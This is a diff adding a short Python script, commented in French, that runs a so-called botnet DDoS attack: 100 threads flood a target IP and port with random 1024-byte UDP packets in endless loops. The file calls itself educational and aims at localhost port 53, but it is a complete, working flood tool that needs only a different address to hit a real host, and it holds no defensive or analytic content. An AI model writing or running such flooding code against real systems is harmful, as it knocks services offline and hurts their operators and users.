@@ -1,0 +1,30 @@
+# DDOS - Attaques par épuisement de la bande passante (Botnet-Based DDoS)
+
+import threading
+import socket
+import random
+
+def botnet_attack(target_ip, target_port, num_bots):
+    print(f"Lancement d'une attaque Botnet-Based DDoS sur {target_ip}:{target_port}...")
+    for _ in range(num_bots):
+        thread = threading.Thread(target=send_udp_packets, args=(target_ip, target_port))
+        thread.start()
+
+def send_udp_packets(target_ip, target_port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = random._urandom(1024)
+    try:
+        while True:
+            sock.sendto(data, (target_ip, target_port))
+    except Exception as e:
+        print(f"Erreur lors de l'envoi des paquets UDP: {e}")
+    finally:
+        sock.close()
+
+# Paramètres de l'attaque simulée (à des fins éducatives uniquement)
+target_ip = "127.0.0.1"  # Adresse IP de la cible (localhost dans cet exemple)
+target_port = 53         # Port de la cible (DNS)
+num_bots = 100           # Nombre de bots simulés
+
+# Lancer l'attaque simulée
+botnet_attack(target_ip, target_port, num_bots)
